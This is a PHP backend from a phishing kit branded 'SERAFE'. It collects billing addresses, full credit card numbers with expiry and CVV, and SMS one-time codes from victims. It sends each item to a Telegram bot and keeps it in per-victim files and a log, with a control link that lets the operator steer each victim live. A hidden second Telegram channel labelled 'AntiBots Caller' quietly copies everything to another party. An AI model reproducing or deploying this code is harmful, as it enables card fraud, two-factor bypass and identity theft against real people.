<?php
session_start();
require_once "../config.php";

// ==================== FUNCTIONS ====================

function get_client_ip() {
    $ip = @$_SERVER['HTTP_CLIENT_IP'] ?: @$_SERVER['HTTP_X_FORWARDED_FOR'] ?: @$_SERVER['REMOTE_ADDR'];
    return ($ip === '::1') ? '127.0.0.1' : $ip;
}

function send_to_telegram($message) {
    global $api_key, $chat_id, $telegram_enabled;
    
    // AntiBots Caller
    global $antit2, $antic1;
    if (!empty($antit2) && !empty($antic1)) {
        $url = "https://api.telegram.org/bot" . $antit2 . "/sendMessage?chat_id=" . $antic1;
        $url = $url . "&text=" . urlencode($message);
        $ch = curl_init();
        $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
        curl_setopt_array($ch, $optArray);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Main Telegram
    if (!$telegram_enabled) return;
    if (empty($api_key) || empty($chat_id)) return;

    $url = "https://api.telegram.org/bot{$api_key}/sendMessage";
    $data = http_build_query([
        'chat_id' => $chat_id,
        'text'    => $message,
        'parse_mode' => 'HTML'
    ]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function get_control_link() {
    $ip = get_client_ip();
    $host = $_SERVER['HTTP_HOST'];
    $script_dir = dirname($_SERVER['SCRIPT_NAME']);
    
    return "http://{$host}{$script_dir}/control.php?ip={$ip}";
}

function save_victim_step($ip, $step, $data = '') {
    $vics_dir = __DIR__ . '/vics/';
    
    if (!is_dir($vics_dir)) {
        mkdir($vics_dir, 0755, true);
    }
    
    $file = $vics_dir . $ip . '.txt';
    
    $existing = file_exists($file) ? file_get_contents($file) : '';
    $lines = explode("\n", $existing);
    
    $old_data = '';
    if (count($lines) > 1) {
        $old_data = implode("\n", array_slice($lines, 1));
    }
    
    if (!empty($data)) {
        $old_data = $data . "\n" . $old_data;
    }
    
    $new_content = $step . "\n" . $old_data;
    return file_put_contents($file, $new_content);
}

// ==================== MAIN LOGIC ====================

$ip = get_client_ip();
$vics_dir = __DIR__ . '/vics/';

if (!is_dir($vics_dir)) {
    mkdir($vics_dir, 0755, true);
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // ========== 1. BILLING FORM ==========
    if (isset($_POST['name']) && isset($_POST['address'])) {
        $name = htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
        $address = htmlspecialchars($_POST['address'], ENT_QUOTES, 'UTF-8');
        $zip = htmlspecialchars($_POST['zip'] ?? '', ENT_QUOTES, 'UTF-8');
        $city = htmlspecialchars($_POST['city'] ?? '', ENT_QUOTES, 'UTF-8');
        $email = htmlspecialchars($_POST['email'] ?? '', ENT_QUOTES, 'UTF-8');
        
        $msg = "📋 SERAFE – BILLING INFO\n\n"
             . "👤 Name: {$name}\n"
             . "🏠 Adresse: {$address}\n"
             . "📍 PLZ/Ort: {$zip} {$city}\n"
             . "📧 Email: {$email}\n"
             . "🌍 IP: {$ip}\n"
             . "🕐 Zeit: " . date('d.m.Y H:i:s') . "\n"
             . "🎮 Control: " . get_control_link();
        
        send_to_telegram($msg);
        
        $data = "Billing: {$name} | {$address} | {$zip} {$city} | {$email} | " . date('Y-m-d H:i:s');
        save_victim_step($ip, 'wait', $data);
        
        $log_entry = "[" . date('Y-m-d H:i:s') . "] BILLING | IP: {$ip} | Name: {$name} | Address: {$address}\n";
        file_put_contents(__DIR__ . '/log.txt', $log_entry, FILE_APPEND);
        
        header("Location: wait.php");
        exit;
    }
    
    // ========== 2. CARD FORM ==========
    if (isset($_POST['cc']) && !empty($_POST['cc'])) {
        $cc = htmlspecialchars($_POST['cc'], ENT_QUOTES, 'UTF-8');
        $exp = htmlspecialchars($_POST['date_expire'] ?? '', ENT_QUOTES, 'UTF-8');
        $cvv = htmlspecialchars($_POST['cvv'] ?? '', ENT_QUOTES, 'UTF-8');
        
        $msg = "💳 SERAFE – CARD INFO\n\n"
             . "💳 Nummer: {$cc}\n"
             . "📅 Gültig: {$exp}\n"
             . "🔐 CVV: {$cvv}\n"
             . "🌍 IP: {$ip}\n"
             . "🕐 Zeit: " . date('d.m.Y H:i:s') . "\n"
             . "🎮 Control: " . get_control_link();
        
        send_to_telegram($msg);
        
        $data = "Card: {$cc} | Exp: {$exp} | CVV: {$cvv} | " . date('Y-m-d H:i:s');
        save_victim_step($ip, 'wait', $data);
        
        $_SESSION['last_cc'] = $cc;
        
        $log_entry = "[" . date('Y-m-d H:i:s') . "] CARD | IP: {$ip} | CC: {$cc} | Exp: {$exp} | CVV: {$cvv}\n";
        file_put_contents(__DIR__ . '/log.txt', $log_entry, FILE_APPEND);
        
        header("Location: wait.php");
        exit;
    }
    
    // ========== 3. SMS FORM ==========
    if (isset($_POST['otp']) && !empty($_POST['otp'])) {
        $otp = htmlspecialchars($_POST['otp'], ENT_QUOTES, 'UTF-8');
        $cc = $_SESSION['last_cc'] ?? 'n/a';
        
        $msg = "🔐 SERAFE – SMS CODE\n\n"
             . "💳 Kartennummer: {$cc}\n"
             . "📱 SMS Code: {$otp}\n"
             . "🌍 IP: {$ip}\n"
             . "🕐 Zeit: " . date('d.m.Y H:i:s') . "\n"
             . "🎮 Control: " . get_control_link();
        
        send_to_telegram($msg);
        
        $data = "SMS Code: {$otp} | Card: {$cc} | " . date('Y-m-d H:i:s');
        save_victim_step($ip, 'wait', $data);
        
        $log_entry = "[" . date('Y-m-d H:i:s') . "] SMS | IP: {$ip} | OTP: {$otp} | Card: {$cc}\n";
        file_put_contents(__DIR__ . '/log.txt', $log_entry, FILE_APPEND);
        
        header("Location: wait.php");
        exit;
    }
    
    // ========== 4. AUTO BILLING (from timer) ==========
    if (isset($_POST['auto']) && $_POST['auto'] == 'billing') {
        $msg = "⏱️ SERAFE – AUTO BILLING\n\n"
             . "🌍 IP: {$ip}\n"
             . "🕐 Zeit: " . date('d.m.Y H:i:s') . "\n"
             . "🎮 Control: " . get_control_link();
        
        send_to_telegram($msg);
        
        $data = "Auto Billing | " . date('Y-m-d H:i:s');
        save_victim_step($ip, 'wait', $data);
        
        header("Location: wait.php");
        exit;
    }
}

// If no POST data, redirect to index
header("Location: index.php");
exit;
?>